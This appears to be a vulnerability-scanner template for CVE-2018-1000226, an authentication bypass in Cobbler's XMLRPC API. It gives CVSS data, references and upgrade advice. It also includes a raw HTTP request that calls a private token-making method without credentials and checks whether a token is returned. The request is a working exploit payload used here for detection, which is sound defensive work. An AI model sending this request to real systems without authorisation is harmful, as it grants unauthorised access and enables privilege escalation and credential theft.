id: CVE-2018-1000226
info:
  name: Cobbler - Authentication Bypass
  author: c-sh0
  severity: critical
  description: Cobbler versions 2.6.11+ and potentially earlier versions are susceptible
    to an authentication bypass vulnerability in XMLRPC API that can lead to privilege
    escalation, data manipulation, or exfiltration, and LDAP credential harvesting
    due to improper validation of security tokens in API endpoints.
  reference:
  - https://github.com/cobbler/cobbler/issues/1916
  - https://movermeyer.com/2018-08-02-privilege-escalation-exploits-in-cobblers-api/
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1000226
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-1000226
    cwe-id: CWE-732
  tags: cve,cve2018,cobbler,auth-bypass
  metadata:
    impact: The authentication bypass vulnerability in Cobbler's XMLRPC API can lead
      to privilege escalation, data manipulation or exfiltration, and LDAP credential
      harvesting, exploiting improper validation of security tokens, making it a significant
      impact to security.
    recommendation: It is recommended that users of Cobbler immediately update to
      version 2.8.5 or higher to mitigate the authentication bypass vulnerability
      (CVE-2018-1000226) and protect against potential privilege escalation, data
      manipulation or exfiltration, and LDAP credential harvesting.
requests:
- raw:
  - "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    \n<?xml version='1.0'?>\n<methodCall>\n  <methodName>_CobblerXMLRPCInterface__make_token</methodName>\n\
    \  <params>\n    <param>\n      <value>\n        <string>cobbler</string>\n  \
    \    </value>\n    </param>\n  </params>\n</methodCall>\n"
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - 'Content-Type: text/xml'
  - type: word
    part: body
    words:
    - <methodResponse>
  - type: dsl
    dsl:
    - '!contains(tolower(body), ''<name>faultCode</name>'')'
  - type: regex
    part: body
    regex:
    - (.*[a-zA-Z0-9].+==)</string></value>
